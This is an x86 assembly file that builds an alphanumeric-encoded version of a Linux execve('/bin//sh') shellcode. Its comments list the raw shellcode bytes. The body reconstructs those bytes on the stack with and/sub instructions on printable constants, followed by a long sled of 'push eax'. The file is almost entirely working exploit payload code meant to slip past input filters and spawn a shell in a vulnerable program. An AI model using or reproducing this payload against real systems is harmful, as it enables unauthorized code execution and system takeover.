global _start
	_start:
		;========================
		; \x90\x90\x90\x31
		; \xc9\x51\x68\x2f
		; \x2f\x73\x68\x68
		; \x2f\x62\x69\x6e
		; \x89\xe3\x6a\x0b
		; \x58\x99\xcd\x80
		;========================
		;  add esp, 1024
		;========================
		push esp
		pop eax
		; add eax, 828 <==> sub eax, (2**32 - 828)
		sub eax, 55555442H
		sub eax, 55555442H
		sub eax, 55555442H
		push eax
		pop esp
		;========================
		;  set eax = 90909090
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 25252526H
		sub eax, 25252525H
		sub eax, 25252525H
		push eax
		;========================
		;  set eax = 90909080
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 2525252bH
		sub eax, 2525252bH
		sub eax, 2525252aH
		push eax
		;========================
		;  set eax = cd99580b
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 65223852H
		sub eax, 66223852H
		sub eax, 67223751H
		push eax
		;========================
		;  set eax = 6ae3896e
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 325e2831H
		sub eax, 315e2731H
		sub eax, 31602730H
		push eax
		;========================
		;  set eax = 69622f68
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 32354633H
		sub eax, 32344533H
		sub eax, 32344532H
		push eax
		;========================
		;  set eax = 68732f2f
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 332f4646H
		sub eax, 322f4546H
		sub eax, 322e4545H
		push eax
		;========================
		;  set eax = 6851c931
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 333a6745H
		sub eax, 323a6745H
		sub eax, 32396845H
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax

